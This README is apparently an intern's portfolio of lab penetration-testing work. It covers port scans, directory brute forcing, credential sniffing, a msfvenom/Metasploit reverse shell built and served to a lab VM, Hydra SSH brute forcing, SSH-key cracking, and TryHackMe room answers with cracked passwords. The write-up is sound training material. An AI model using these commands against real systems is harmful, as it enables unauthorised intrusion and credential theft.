# ShadowFox Cybersecurity Internship - Emmanuel Ateji

**Program:** Cybersecurity Internship at ShadowFox
**Task Levels:** Beginner, Intermediate, and Advanced

---

## Table of Contents

1. [About the Internship](#about-the-internship)
2. [Task Structure](#task-structure)
3. [Beginner Level Tasks](#beginner-level-tasks)
   - [Task 1 - Port Scanning](#task-1---port-scanning)
   - [Task 2 - Directory Brute Forcing](#task-2---directory-brute-forcing)
   - [Task 3 - Network Traffic Interception](#task-3---network-traffic-interception)
4. [Intermediate Level Tasks](#intermediate-level-tasks)
   - [Task 1 - VeraCrypt Password Decoding and File Decryption](#task-1---veracrypt-password-decoding-and-file-decryption)
   - [Task 2 - PE File Entry Point Analysis](#task-2---pe-file-entry-point-analysis)
   - [Task 3 - Reverse Shell via Metasploit](#task-3---reverse-shell-via-metasploit)
5. [Advanced Level Task](#advanced-level-task)
   - [TryHackMe - Basic Pentesting Room](#tryhackme---basic-pentesting-room)
6. [Tools and Technologies Used](#tools-and-technologies-used)
7. [Skills Developed](#skills-developed)
8. [Repository Structure](#repository-structure)

---

## About the Internship

This repository documents my technical work completed during the **ShadowFox Cybersecurity Internship**. The programme covered practical penetration testing and security assessment tasks across three difficulty levels: Beginner, Intermediate, and Advanced. Each task was documented in a structured security report format covering attack methodology, severity ratings, impact analysis, mitigation steps, and proof-of-concept screenshots.

The target machine used throughout the beginner-level tasks was the intentionally vulnerable web application at `http://testphp.vulnweb.com/`, maintained by Acunetix as a safe testing environment.

---

## Task Structure

| Level | Tasks | Key Focus Areas |
|-------|-------|----------------|
| Beginner | 3 tasks | Port scanning, directory enumeration, network sniffing |
| Intermediate | 3 tasks | Disk encryption, PE file analysis, reverse shell exploitation |
| Advanced | 1 task (multi-part) | Full penetration test on TryHackMe Basic Pentesting room |

---

## Beginner Level Tasks

### Task 1 - Port Scanning

**Attack Type:** Port Scanning
**Target:** `http://testphp.vulnweb.com/` (IP: `139.162.174.209`)
**Severity:** High (CVSS 7.0 - 8.9)
**Tool Used:** Nmap

**Methodology:**

The target IP was first identified using the `ping` command, then a full service and version detection scan was run using `nmap -sV -A 139.162.174.209`.

**Findings:**

| Port | Protocol | State | Service | Version |
|------|----------|-------|---------|---------|
| 80 | TCP | Open | HTTP | OpenResty 1.27.1.2 |
| 443 | TCP | Open | SSL/HTTPS | OpenResty 1.27.1.2 |

Port 80 running unencrypted HTTP is of particular concern as it exposes all traffic to potential man-in-the-middle interception.

**Impact:** Unencrypted HTTP traffic exposes credentials and sensitive data; open ports provide potential entry points for attackers.

**Mitigation:** Redirect all HTTP traffic to HTTPS (port 443), keep OpenResty patched to the latest version, implement logging and monitoring, and restrict access to sensitive directories via server configuration.

---

### Task 2 - Directory Brute Forcing

**Attack Type:** Directory Brute Force
**Target:** `http://testphp.vulnweb.com/`
**Severity:** High (CVSS 7.0 - 8.9)
**Tool Used:** DIRB v2.22

**Methodology:**

DIRB was run against the target using the common wordlist at `/usr/share/dirb/wordlists/common.txt`, generating 4,612 words across the scan.

**Key Directories Discovered:**

| Path | Status |
|------|--------|
| `/admin/` | 200 OK |
| `/cgi-bin/` | 403 Forbidden |
| `/CVS/` | 200 OK |
| `/images/` | 200 OK |
| `/pictures/` | 200 OK |
| `/secured/` | 200 OK |
| `/vendor/` | 200 OK |

**Significant Files Discovered:** `crossdomain.xml`, `CVS/Entries`, `CVS/Repository`, `CVS/Root`, `favicon.ico`, `id_rsa.pub` (HTTP 500), `index.php`

**Scan Stats:** Start: 10:59:58 / End: 11:28:08 / Downloaded: 6,639 / Found: 9

**Impact:** Exposed `admin`, `CVS`, `secured`, and `vendor` directories likely contain sensitive configuration data, credentials, or proprietary code exploitable for further access.

**Mitigation:** Implement strong authentication on sensitive directories, encrypt stored data, set restrictive file permissions, monitor access logs, and maintain regular backups.

---

### Task 3 - Network Traffic Interception

**Attack Type:** Network Sniffing
**Target:** `http://testphp.vulnweb.com/login.php`
**Severity:** High (CVSS 7.0 - 8.9)
**Tool Used:** Wireshark

**Methodology:**

1. Wireshark was launched and packet capture was started on the active network interface.
2. A login attempt was made at `http://testphp.vulnweb.com/login.php` using credentials `test:test`.
3. Capture was stopped and HTTP traffic was isolated using the `http` display filter in Wireshark.
4. The HTTP POST request to `/userinfo.php` was inspected.

**Result:** Login credentials (`username=test`, `password=test`) were visible in plaintext in the captured HTTP POST request body, transmitted without any encryption.

**Impact:** Credentials exposed in transit allow session hijacking, account takeover, financial fraud, and privacy violations.

**Mitigation:** Enforce HTTPS for all communication, implement credential encryption in transit, add Multi-Factor Authentication (MFA), monitor network traffic with an IDS, and keep all software patched.

---

## Intermediate Level Tasks

### Task 1 - VeraCrypt Password Decoding and File Decryption

**Attack Type:** Password Decoding and File Decryption
**Severity:** High (CVSS 5.5 - 7.5)
**Tools Used:** VeraCrypt, hash-identifier, hashes.com, Notepad

**Methodology:**

1. **Hash identification:** The file `encoded.txt` contained the hash `482c811da5d5b4bc6d497ffa98491e38`. The `hash-identifier` tool was used to identify it as MD5.
2. **Hash decryption:** The MD5 hash was submitted to `hashes.com`, which returned the plaintext password: `password123`.
3. **File decryption:** VeraCrypt was opened, the provided encrypted volume (`shadowfox veracrypt.txt`) was selected, and the decrypted password `password123` was entered to mount the volume.
4. **Secret extraction:** After mounting, the volume revealed a file containing the secret code: `never giveup`.

**Impact:** Weak MD5 hashing of passwords allows trivial decryption via rainbow table lookups, exposing encrypted file contents and potentially sensitive data.

**Mitigation:** Use stronger hashing algorithms such as bcrypt or Argon2, enforce complex password policies, and apply salting before hashing to prevent rainbow table attacks.

---

### Task 2 - PE File Entry Point Analysis

**Attack Type:** Discovering a PE (Portable Executable) File Entry Point
**Severity:** Medium to High (CVSS 5.0 - 7.5)
**Tools Used:** PE Explorer (Heaventools), Windows 11

**Methodology:**

1. PE Explorer was installed on Windows 11.
2. The provided VeraCrypt executable (`shadowfox veracrypt.exe`) was opened in PE Explorer via `File > Open`.
3. The PE Headers section was examined.
4. The Address of Entry Point was located in the PE header fields.

**Result:** Address of Entry Point = `00423780h`

**Additional PE Header Details:**

| Field | Value |
|-------|-------|
| Machine | 014Ch (i386) |
| Number of Sections | 005h |
| Linker Version | 10.0 |
| Size of Code | 00073C00h |
| Address of Entry Point | 00423780h |
| Image Base | 00400000h |

**Impact:** Knowledge of an executable's entry point can be leveraged to inject malicious code that executes before any legitimate program logic, enabling system compromise.

**Mitigation:** Sign executables with digital certificates, perform routine security audits of binaries, use hash-based integrity verification before execution, and keep antivirus/anti-malware tooling current.

---

### Task 3 - Reverse Shell via Metasploit

**Attack Type:** Reverse Shell Exploitation
**Severity:** High (CVSS 8.0)
**Tools Used:** Kali Linux, Metasploit Framework (v6.4.56), msfvenom, Python HTTP Server, VirtualBox, Windows 10 VM

**Methodology:**

**Step 1 - IP identification:** The Kali Linux attacker VM's IP address was noted (`192.168.56.101`) using `ifconfig`.

**Step 2 - Payload creation:** msfvenom was used to generate a Windows reverse shell executable:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o shell.exe
```
Payload size: 354 bytes / Final .exe size: 73,802 bytes.

**Step 3 - Payload delivery:** A Python HTTP server was started on Kali (`python3 -m http.server 8000`) to host `shell.exe`. The payload was downloaded on the Windows 10 VM via browser.

**Step 4 - Listener setup:** Metasploit's `multi/handler` was configured:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit
```

**Step 5 - Execution and session:** `shell.exe` was executed on the Windows 10 VM. A Meterpreter session was opened. Access was verified with `sysinfo` (returning `Windows 10 Build 19045`) and `getuid`.

**Impact:** Full remote command execution on a Windows system; post-exploitation potential includes privilege escalation, data exfiltration, and persistence.

**Mitigation:** Implement application whitelisting, train users on risks of executing unknown files, segment VMs and critical assets, and deploy behaviour-based endpoint detection tools.

---

## Advanced Level Task

### TryHackMe - Basic Pentesting Room

**Platform:** [TryHackMe](https://tryhackme.com/room/basicpentestingjt)
**Attack Type:** Privilege Escalation and Web Application Testing
**Severity:** High (CVSS 7.2)
**Tools Used:** Nmap, DIRB, smbclient, enum4linux, Hydra, SSH, linpeas.sh, John the Ripper, OpenVPN

**Overview:**

A full penetration test was conducted on the TryHackMe Basic Pentesting room, progressing through reconnaissance, enumeration, exploitation, and privilege escalation phases to answer 11 challenge questions and achieve 100% room completion.

**Attack Phases and Q&A Summary:**

**Phase 1 - Reconnaissance (Nmap)**

A basic scan (`nmap 10.10.22.132`) revealed 6 open ports, followed by an aggressive scan (`nmap -sV -A 10.10.22.132`) for service/version detail:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.18 |
| 139/tcp | NetBIOS-SSN | Samba 3.X - 4.X |
| 445/tcp | Microsoft-DS | Samba 4.3.11 |
| 8009/tcp | AJP13 | Apache Jserv |
| 8080/tcp | HTTP-Proxy | Apache Tomcat 9.0.7 |

OS detected: Linux 4.4 / Ubuntu 16.04.4 LTS

**Phase 2 - Web Enumeration (DIRB + Browser)**

DIRB was run against `http://10.10.22.132`, discovering the `/development/` directory. The directory contained two files: `dev.txt` (developer notes referencing SMB configuration and Apache setup) and `j.txt` (a note about auditing `/etc/shadow` for weak credentials).

**Q3: What is the name of the hidden directory on the web server?**
Answer: `development`

**Phase 3 - SMB Enumeration (smbclient + enum4linux)**

`smbclient -L 10.10.22.132` revealed anonymous login and shared resources including an `Anonymous` disk share. `enum4linux 10.10.22.132` enumerated two local users: `jan` and `kay`.

**Q5: What is the username?**
Answer: `jan`

**Phase 4 - SSH Brute Force (Hydra)**

Hydra was used to brute-force Jan's SSH password against the `rockyou.txt` wordlist:
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.246.7
```
Password found: `armando`

**Q6: What is the password?**
Answer: `armando`

**Q7: What service do you use to access the server?**
Answer: `SSH`

**Phase 5 - Post-Exploitation and Privilege Escalation (linpeas.sh + John the Ripper)**

After SSH login as `jan`, the home directory of user `kay` was discovered containing `pass.bak` (root-only readable). `linpeas.sh` was transferred via SCP and executed to audit privilege escalation vectors. An encrypted RSA private key was found at `/home/kay/.ssh/id_rsa`.

The private key was extracted, converted to a crackable hash using `ssh2john`, and cracked with John the Ripper against `rockyou.txt`:
```
ssh2john kay.txt > kay_hash.txt
john kay_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Private key passphrase cracked: `beeswax`

SSH was then established as `kay` using the decrypted private key. `pass.bak` was read with `cat`, revealing the final password.

**Q9: What is the name of the other user you found?**
Answer: `kay`

**Q11: What is the final password you obtain?**
Answer: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

**Room completion: 100%**

**Impact:** Weak SSH credentials combined with misconfigured SMB services and an exposed private key allowed full system compromise and privilege escalation to root access.

**Mitigation:** Enforce strong passwords and fail2ban on SSH, disable anonymous SMB access, restrict SUID binaries, protect private key files with strong passphrases, and audit with tools like linpeas regularly.

---

## Tools and Technologies Used

| Tool | Version / Type | Purpose |
|------|---------------|---------|
| Nmap | 7.95 | Port scanning and service/version detection |
| DIRB | v2.22 | Web directory brute forcing |
| Wireshark | Desktop | Network packet capture and HTTP analysis |
| Metasploit Framework | v6.4.56-dev | Payload generation, listener setup, session management |
| msfvenom | Metasploit utility | Crafting the reverse shell `.exe` payload |
| Hydra | v9.5 | SSH password brute forcing |
| John the Ripper | Desktop | Offline SSH private key hash cracking |
| enum4linux | v0.9.1 | SMB/Samba user and share enumeration |
| smbclient | Built-in Kali | SMB share access and enumeration |
| linpeas.sh | GitHub release | Linux privilege escalation auditing |
| VeraCrypt | v1.25.7 | Encrypted volume mounting and decryption |
| PE Explorer | Heaventools | Portable Executable file header analysis |
| hash-identifier | Kali built-in | Identifying hash types |
| hashes.com | Web-based | Online MD5 hash decryption |
| Python HTTP Server | Built-in Python 3 | Payload delivery over local network |
| OpenVPN | Desktop | VPN connection to TryHackMe network |
| VirtualBox | Hypervisor | Hosting attacker and victim VMs in isolated lab |
| Kali Linux | Rolling | Primary penetration testing OS |
| Windows 10 VM | Virtual Machine | Target system for reverse shell demonstration |
| Firefox Browser | Desktop | Web application interaction and traffic generation |

---

## Skills Developed

**Network Scanning and Reconnaissance**
Identifying open ports, running services, OS fingerprinting, and version detection using Nmap with varying scan profiles (`-sV`, `-A`) against both direct IP targets and TryHackMe lab machines.

**Web Application Enumeration**
Directory brute forcing with DIRB to discover hidden paths, inspecting page source for developer comments revealing attack vectors, and navigating discovered directories for sensitive files.

**Network Traffic Analysis**
Capturing and filtering live HTTP traffic in Wireshark to extract plaintext credentials from POST requests, demonstrating the risk of unencrypted web authentication.

**Cryptography and Hash Analysis**
Identifying hash types using `hash-identifier`, decrypting MD5 hashes via online lookup tables, and cracking encrypted SSH private key passphrases using John the Ripper with the `rockyou.txt` wordlist.

**Disk Encryption and File Forensics**
Mounting VeraCrypt-encrypted volumes using decoded passwords and extracting hidden secret codes from the mounted file system.

**PE File Analysis and Reverse Engineering**
Parsing Windows Portable Executable (PE) file headers using PE Explorer to locate the program entry point address - a key step in binary analysis and vulnerability assessment.

**Payload Generation and Delivery**
Creating Windows Meterpreter reverse shell payloads with msfvenom, hosting them via a Python HTTP server, and delivering them to a target Windows VM for execution.

**Exploitation and Post-Exploitation**
Configuring Metasploit `multi/handler` listeners, establishing Meterpreter sessions, and verifying access using `sysinfo` and `getuid`. Conducting SMB enumeration, SSH brute forcing, and privilege escalation auditing via linpeas.sh.

**Privilege Escalation**
Using linpeas.sh to identify SSH private keys stored in user home directories, extracting and cracking encrypted keys with John the Ripper, then using the decrypted key to escalate access to a more privileged user account and read restricted files.

**Security Report Writing**
Producing structured security assessment reports for each task covering: attack name, severity rating (CVSS), methodology with step-by-step reproduction, impact analysis, and detailed mitigation recommendations.

---

## Repository Structure

```
/
├── reports/
│   ├── Beginner_Level_Report.pdf
│   ├── Intermediate_Level_Report.pdf
│   └── Advanced_Level_TryHackMe_Report.pdf
└── README.md
```

---

**Author:** Emmanuel Ateji
**Internship:** ShadowFox Cybersecurity
